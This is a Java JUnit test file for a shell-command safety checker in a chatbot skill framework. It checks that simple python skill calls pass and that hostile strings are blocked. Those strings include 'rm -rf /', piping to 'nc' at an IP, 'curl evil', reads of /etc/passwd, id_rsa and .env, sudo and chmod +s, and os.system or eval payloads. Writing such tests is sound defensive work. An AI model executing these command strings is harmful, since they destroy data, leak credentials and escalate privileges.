package com.iflytek.chatbot.skill.shell;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class ShellCommandSafetyCheckerTest {

    private final ShellCommandSafetyChecker checker = new ShellCommandSafetyChecker();

    @Test
    void allows_simple_python_skill_call() {
        assertTrue(checker.check("python C:/tmp/skills/weather/scripts/get_weather.py 北京").allow());
        assertTrue(checker.check("python3 /tmp/skills/calc/scripts/run.py 1 2").allow());
    }

    @Test
    void allows_absolute_python_path() {
        // python 在 Windows 上可能传完整路径
        assertTrue(checker.check("C:/Python310/python.exe /tmp/skills/x.py").allow());
    }

    @Test
    void rejects_empty_or_blank() {
        assertFalse(checker.check(null).allow());
        assertFalse(checker.check("").allow());
        assertFalse(checker.check("   ").allow());
    }

    @Test
    void rejects_overlong_command() {
        String huge = "python " + "a".repeat(3000);
        assertFalse(checker.check(huge).allow());
    }

    @Test
    void rejects_shell_metacharacters() {
        assertFalse(checker.check("python a.py; rm -rf /").allow());
        assertFalse(checker.check("python a.py && curl evil").allow());
        assertFalse(checker.check("python a.py | nc 1.2.3.4 80").allow());
        assertFalse(checker.check("python `whoami`").allow());
        assertFalse(checker.check("python $(whoami)").allow());
        assertFalse(checker.check("python a.py > /tmp/x").allow());
    }

    @Test
    void rejects_non_whitelisted_executable() {
        assertFalse(checker.check("bash -c whoami").allow());
        assertFalse(checker.check("powershell -e blah").allow());
        assertFalse(checker.check("node x.js").allow());
        assertFalse(checker.check("sh -c ls").allow());
    }

    @Test
    void rejects_known_dangerous_tokens() {
        assertFalse(checker.check("python -c 'import os; os.system(\"ls\")'").allow());
        assertFalse(checker.check("python -c \"__import__('os').system('rm')\"").allow());
        assertFalse(checker.check("python /tmp/read_env.py /etc/passwd").allow());
        assertFalse(checker.check("python /tmp/x.py id_rsa").allow());
        assertFalse(checker.check("python /tmp/x.py .env").allow());
    }

    @Test
    void rejects_privilege_escalation() {
        // sudo / chmod 等在首词白名单已经过滤；这里测的是参数里携带的情况
        // 由于首词必须是 python/python3，sudo/chmod 作为首词会被首词检查挡掉
        assertFalse(checker.check("sudo python a.py").allow());
        assertFalse(checker.check("chmod +s /tmp/x").allow());
    }

    @Test
    void rejects_encoded_payloads() {
        assertFalse(checker.check("python -c 'eval(\"...\")'").allow());
        assertFalse(checker.check("python /tmp/x.py base64 -d").allow());
    }
}
